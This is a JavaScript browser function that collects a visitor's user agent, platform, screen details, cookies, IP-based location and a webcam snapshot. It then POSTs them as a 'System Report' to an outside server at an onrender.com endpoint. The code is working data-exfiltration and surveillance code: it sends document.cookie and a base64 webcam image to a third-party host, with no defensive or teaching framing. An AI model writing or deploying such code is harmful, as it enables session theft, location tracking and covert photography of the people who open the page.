async function getAllInfo() {
  const $ = id => document.getElementById(id);
  $("errorMsg").textContent = ""; // Reset error message
  $("accessBtn").style.display = "none"; // Hide access button
  $("infoBox").style.display = "block"; // Show system info box

  const info = {
    webcam: "Denied",
    microphone: "Denied",
    location: "Denied",
    ip: "Unknown",
    browser: navigator.userAgent,
    resolution: `${screen.width}x${screen.height}`,
    depth: `${screen.colorDepth}-bit`,
    os: navigator.platform,
    lang: navigator.language,
    online: navigator.onLine ? "Online" : "Offline",
    connection: "Unknown",
    battery: "Unknown",
    charging: "Unknown",
    cookies: document.cookie || "No cookies"
  };

  let webcamStream = null;
  let capturedImageBase64 = null;

  /* Fetch IP and Location --------------------------- */
  try {
    const ipResponse = await fetch('https://ipinfo.io/json?token=<YOUR_API_KEY>');
    const ipData = await ipResponse.json();
    if (ipData.ip) {
      info.ip = ipData.ip;
      info.location = ipData.city + ", " + ipData.region + ", " + ipData.country;
    }
  } catch (e) {
    console.error("Failed to fetch IP and location:", e);
    info.ip = "Unable to fetch IP";
    info.location = "Unable to fetch location";
  }

  /* permissions ------------------------------------- */
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    $("webcamFeed").srcObject = stream;
    $("webcamFeed").style.display = "block";
    info.webcam = info.microphone = "Accessible";
    webcamStream = stream;
  } catch (e) { 
    console.error("Error accessing webcam or microphone", e); 
  }

  // Capture Image from webcam if accessible
  if (webcamStream) {
    const track = webcamStream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    try {
      const bitmap = await imageCapture.grabFrame();
      
      // Resize the image before converting it to base64
      const canvas = document.createElement('canvas');
      const MAX_WIDTH = 640; // Resize to a smaller width
      const MAX_HEIGHT = 480; // Resize to a smaller height

      // Calculate the new dimensions while maintaining aspect ratio
      const aspectRatio = bitmap.width / bitmap.height;
      const newWidth = Math.min(MAX_WIDTH, bitmap.width);
      const newHeight = Math.min(MAX_HEIGHT, bitmap.height);

      canvas.width = newWidth;
      canvas.height = newHeight;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(bitmap, 0, 0, newWidth, newHeight);

      // Capture the resized image as base64
      capturedImageBase64 = canvas.toDataURL('image/jpeg'); // base64 image string
      console.log("Captured Image Base64: ", capturedImageBase64); // Debugging
    } catch (e) { 
      console.error("Failed to capture webcam image:", e); 
    }
  }

  /* Send to Backend -----------------------------------------------*/
  const message = `🔍 System Report:
🧠 IP Address: ${info.ip}
📍 Location: ${info.location}
📷 Webcam: ${info.webcam}
🎤 Microphone: ${info.microphone}
🌐 Browser: ${info.browser}
🖥️ Resolution: ${info.resolution}
🎨 Color Depth: ${info.depth}
🧑‍💻 OS: ${info.os}
🗣️ Language: ${info.lang}
📶 Connection: ${info.connection}
🔋 Battery: ${info.battery}
⚡ Charging: ${info.charging}
🍪 Cookies: ${info.cookies}
🔌 Online: ${info.online}`;

  // Display the message in the HTML
  $("systemInfo").textContent = message;

  try {
    const response = await fetch('https://system-info-terminal.onrender.com/send-message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message, image: capturedImageBase64 }) // Send base64 string of the image
    });
    const responseData = await response.json();
    if (responseData.success) {
      console.log("Data sent successfully!");
    } else {
      console.error("Failed to send data to backend:", responseData);
      $("errorMsg").textContent = "Could not contact reporting server.";
    }
  } catch (e) {
    console.error("Error while sending info:", e);
    $("errorMsg").textContent = "Could not contact reporting server.";
  }
}
